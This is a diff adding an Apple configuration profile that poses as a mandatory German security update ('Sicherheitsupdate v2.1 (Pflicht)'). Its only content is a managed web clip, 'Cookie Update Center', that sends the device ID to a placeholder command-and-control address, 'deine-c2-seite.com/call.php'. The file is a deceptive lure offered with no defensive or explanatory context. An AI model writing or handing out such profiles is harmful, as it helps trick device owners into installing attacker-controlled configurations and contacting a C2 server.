@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadIdentifier</key>
+    <string>com.cookieclicker.update</string>
+    <key>PayloadUUID</key>
+    <string>4A8E5A2E-EB3F-4B1D-9A8A-2A5A7E5A8E5A</string>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    <key>PayloadDisplayName</key>
+    <string>Sicherheitsupdate v2.1 (Pflicht)</string>
+    <key>PayloadDescription</key>
+    <string>Behebt kritische Schwachstellen.</string>
+    <key>PayloadContent</key>
+    <array>
+        
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.webClip.managed</string>
+            <key>PayloadIdentifier</key>
+            <string>com.cookieclicker.webclip</string>
+            <key>PayloadUUID</key>
+            <string>1A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6D</string>
+            <key>PayloadDisplayName</key>
+            <string>Cookie Update Center</string>
+            <key>URL</key>
+            <string>https://deine-c2-seite.com/call.php?id=%DEVICE_ID%</string>
+            <key>IconDefaults</key>
+            <false/>
+            <key>IsRemovable</key>
+            <true/>
+        </dict>
+    </array>
+</dict>
+</plist>
